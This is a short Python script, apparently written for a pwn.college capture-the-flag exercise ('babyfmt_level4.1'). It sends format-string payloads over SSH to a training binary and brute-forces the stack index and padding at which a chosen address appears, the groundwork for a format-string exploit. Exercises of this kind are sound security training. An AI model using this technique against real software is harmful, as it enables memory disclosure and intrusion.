import subprocess
import struct

ADDR = 0x4040E0
SSH = [
    "ssh",
    "-i",
    "../key",
    "hacker@dojo.pwn.college",
    "/challenge/babyfmt_level4.1",
]

import sys
import re

start = int(sys.argv[1]) if len(sys.argv) > 1 else 50
end = int(sys.argv[2]) if len(sys.argv) > 2 else 70

fmt_template = ("AAA " + "%p " * 80 + "|%{idx}$p").encode()

for idx in range(start, end):
    fmt = fmt_template.replace(b"{idx}", str(idx).encode(), 1)
    for offset in range(8):
        payload = fmt + b"A" * offset + struct.pack("<Q", ADDR)
        res = subprocess.run(SSH, input=payload, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        out = res.stdout.decode("latin-1", errors="ignore")
        line = next((l for l in out.splitlines() if l.startswith("AAA ")), "")
        value = line.split("|")[-1] if line else ""
        match = re.match(r"(0x[0-9a-f]+)", value.strip())
        if match and match.group(1) == "0x4040e0":
            print("idx", idx, "offset", offset, "value", match.group(1))
            raise SystemExit
print("not found")
